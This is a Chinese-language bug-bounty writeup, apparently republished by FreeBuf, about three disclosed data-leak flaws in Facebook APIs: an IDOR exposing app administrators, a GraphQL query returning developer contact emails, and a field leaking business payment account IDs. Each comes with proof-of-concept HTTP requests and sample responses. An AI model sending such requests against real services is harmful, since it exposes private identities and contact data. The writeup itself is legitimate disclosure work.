![](https://image.3001.net/images/20200214/1581677929_5e467d694cc50.jpg!small)

**本篇Writeup分享的是作者在测试Facebook接口时，发现的三个信息泄露漏洞，可获取任意Facebook应用的管理员账号、开发者联系人邮箱、商务用户账号ID。**

##  获取任意Facebook应用（Facebook application）的管理员账号

在Facebook企业管理平台（BusinessManager）中，可以通过一个接口去获取其它企业的不同网页、应用和相关系统资产的管理员用户列表。

漏洞原因在于，该接口存在IDOR越权漏洞，未对其做权限限制，导致可以通过其获取任意Facebook商务应用的管理员账号。

Facebook企业管理平台可以帮助企业、广告代理商、或行销人员在统一界面下集中管理企业旗下的Facebook主页、广告账号、以及付款方式，从而避免了管理人员需要不断切换界面的尴尬局面。

PoC

请求：

    
    
    POST /business/aymc_assets/admins/ HTTP/1.1
    
        Host: business.facebook.com
    
        asset_ids[0]=TARGET_APP_ID
    
        business_id=ATTACKER_BUSINESS_ID
    
        响应：
    
        {"__ar": 1, "payload": {
    
            "assetAdmins": {
    
              "__imm": {
    
                "method": "Map",
    
                "value": [
    
                  ["123456789",
    
                    {"name": "fname lname",
    
                      "id": "123456789",
    
                      "iconURI": "/images/assets_DO_NOT_HARDCODE/facebook_icons/badge-admin_outline_20_fds-black.png",
    
                      "isSelected": true,
    
                      "isSelectionDisabled": false,
    
                      "secondaryInfo": "FACEBOOK APP NAME"
    
                    }],
    
                  ["123456789xxN",
    
                    {"name": "Admin N",
    
                      "id": "123456789xxN",
    
                      "iconURI": "/images/assets_DO_NOT_HARDCODE/facebook_icons/badge-admin_outline_20_fds-black.png",
    
                      "isSelected": true,
    
                      "isSelectionDisabled": false,
    
                      "secondaryInfo": "FACEBOOK APP NAME"
    
                    }]]}}}}

##  获取Facebook任意应用（Facebook application）的联系人邮箱

在Facebook给出的开发人员应用管理界面中，存在一个开发者联系邮箱字段，用以开发者或管理员之间的交流，通常属隐私信息，虽然这里的页面用到的Graph
API接口是安全的，但是，我在请求中变化成GraphQL方式调用后，竟然能获取到任意Facebook应用的开发者联系邮箱。

请求：

    
    
    POST /graphql
    
        Host: graph.facebook.com
    
        q=nodes(35xxxxx28){name,contact_email}

响应：

    
    
    {
    
          "35xxxxx28": {
    
            "name": "Facebook Application Name"
    
            "name": "contact@company.com"
    
          }
    
        }

##  获取Facebook商务用户账号ID

该漏洞可通过Facebook接口graph
API中的应用节点类型获取到与Facebook应用相关的商务账号ID，由于商务账号ID是公开的，所以Facebook不认为这是一种隐私泄露问题，但之后我又发现，可以请求获取到另一个敏感的用户字段“payment_account_id”，这个字段应该是属于用户隐私，最终Facebook接收了该漏洞。

攻击者用自己账户的access_token，在自身账户权限下就能获取到其他商务用户的账号ID：

    
    
    GET /v3.1/{application-id}/?fields=id,name,business
    
        Host: graph.facebook.com
    
        GET /v3.1/{business-id}/?fields=primary_page,payment_account_id
    
        Host: graph.facebook.com

***参考来源：[amobaikar](https://www.amolbaikar.com/disclose-facebook-business-account-id/)，clouds 编译整理，转载请注明来自 FreeBuf.COM**

  

